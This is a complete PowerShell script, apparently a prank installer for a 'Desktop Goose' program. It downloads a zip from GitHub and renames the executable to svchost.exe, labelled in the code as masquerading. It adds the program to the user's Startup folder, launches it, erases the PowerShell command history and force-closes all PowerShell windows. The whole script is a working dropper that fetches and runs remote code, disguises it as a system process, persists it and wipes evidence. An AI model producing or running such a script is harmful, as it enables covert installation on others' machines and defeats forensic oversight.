 # Variables

$installPath = "$env:LOCALAPPDATA\Blueteeth"

$downloadUri = "https://github.com/Berto1019/GooseTest/archive/refs/heads/main.zip"

$tempZipFile = "$env:TEMP\goosepython.zip"

$sourceExeName = "GooseDesktop.exe"

$masqueradeExeName = "svchost.exe"

$sourceDir = "$installPath\GooseTest-main"

$startupLnkPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup\GooseDesktop.lnk")


# Set Directory

if (!(Test-Path $installPath)) {

    Write-Host "Creating installation directory: $installPath"

    New-Item -ItemType Directory -Path $installPath | Out-Null

}


# Download & Extract

Write-Host "Downloading and extracting file..."

try {

    # Download

    Invoke-WebRequest -Uri $downloadUri -OutFile $tempZipFile -ErrorAction Stop


    # Extract

    Expand-Archive -Path $tempZipFile -DestinationPath $installPath -Force

} catch {

    Write-Error "Failed to download or extract the file: $($_.Exception.Message)"

    Exit

}


# Masquerade

$originalFilePath = Join-Path -Path $sourceDir -ChildPath $sourceExeName

$masqueradeFilePath = Join-Path -Path $sourceDir -ChildPath $masqueradeExeName


if (Test-Path $originalFilePath) {

    Write-Host "Renaming $sourceExeName to $masqueradeExeName for masquerading..."

    Rename-Item -Path $originalFilePath -NewName $masqueradeExeName -Force

} else {

    Write-Error "Source executable not found at $originalFilePath"

    Exit

}


# Add to user startup

Write-Host "Summoning Geese"

try {

    $shell = New-Object -ComObject WScript.Shell

    $shortcut = $shell.CreateShortcut($startupLnkPath)


    # Sets path to renamed file

    $shortcut.TargetPath = $masqueradeFilePath 

    $shortcut.Save()

} catch {

    Write-Error "Failed to create startup shortcut: $($_.Exception.Message)"

}


# Release the goose

Write-Host "Feeding Geese"

Start-Process -FilePath $masqueradeFilePath


# Remove Powershell history

Write-Host "Dropping Bread And Running"

Clear-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt


# Clear Powershell

clear


# Close Powershell

Get-Process -Name powershell, pwsh | Stop-Process -Force -ErrorAction SilentlyContinue 